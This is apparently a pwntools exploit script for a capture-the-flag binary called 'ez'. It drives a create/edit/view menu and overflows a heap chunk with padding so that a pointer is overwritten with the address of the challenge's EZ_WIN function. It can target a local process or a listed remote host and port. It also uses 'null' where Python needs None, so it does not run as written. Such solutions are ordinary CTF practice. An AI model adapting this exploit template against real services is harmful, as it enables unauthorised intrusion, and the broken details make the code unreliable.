#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from os import path
import sys

# ==========================[ Information
DIR = path.dirname(path.abspath(__file__))
EXECUTABLE = "/ez"
TARGET = DIR + EXECUTABLE 
HOST, PORT = "103.185.38.238", 15733
REMOTE, LOCAL = False, False

# ==========================[ Tools
elf = ELF(TARGET)
elfROP = ROP(elf)

# ==========================[ Configuration
context.update(
    arch=["i386", "amd64", "aarch64"][1],
    endian="little",
    os="linux",
    log_level = ['debug', 'info', 'warn'][2],
    terminal = ['tmux', 'split-window', '-h'],
)

# ==========================[ Exploit

def create(size, name):
    global io
    io.sendlineafter(":", "1")
    io.sendlineafter(":", str(size))
    io.sendlineafter(":", name)


def edit(idx, content):
    global io
    io.sendlineafter(":", "2")
    io.sendlineafter(":", str(idx))
    io.sendlineafter(":", content)

def view(idx):
    global io
    io.sendlineafter(":", "3")
    io.sendlineafter(":", str(idx))
    io.recvuntil("Content: ")
    LEAKED = io.recvline()[:-1]
    return LEAKED

def exploit(io, libc=null):
    if LOCAL==True:
        #raw_input("Fire GDB!")
        if len(sys.argv) > 1 and sys.argv[1] == "d":
            choosen_gdb = [
                "source /home/mydata/tools/gdb/gdb-pwndbg/gdbinit.py",     # 0 - pwndbg
                "source /home/mydata/tools/gdb/gdb-peda/peda.py",          # 1 - peda
                "source /home/mydata/tools/gdb/gdb-gef/.gdbinit-gef.py"    # 2 - gef
                ][0]
            cmd = choosen_gdb + """
            
            """
            gdb.attach(io, gdbscript=cmd)

    EZ_WIN = elf.symbols["EZ_WIN"]

    create(0x20, "AAAA")
    create(0x20, "BBBB")

    p = b"A"*8
    p += b"B"*16
    p += b"C"*24
    # p += p64(0) + p64(0x21)
    p += p64(EZ_WIN)

    edit(0, p)

    io.interactive()

if __name__ == "__main__":
    io, libc = null, null

    if args.REMOTE:
        REMOTE = True
        io = remote(HOST, PORT)
        # libc = ELF("___")
    else:
        LOCAL = True
        io = process(
            [TARGET, ],
            env={
            #     "LD_PRELOAD":DIR+"/___",
            #     "LD_LIBRARY_PATH":DIR+"/___",
            },
        )
        # libc = ELF("___")
    exploit(io, libc)
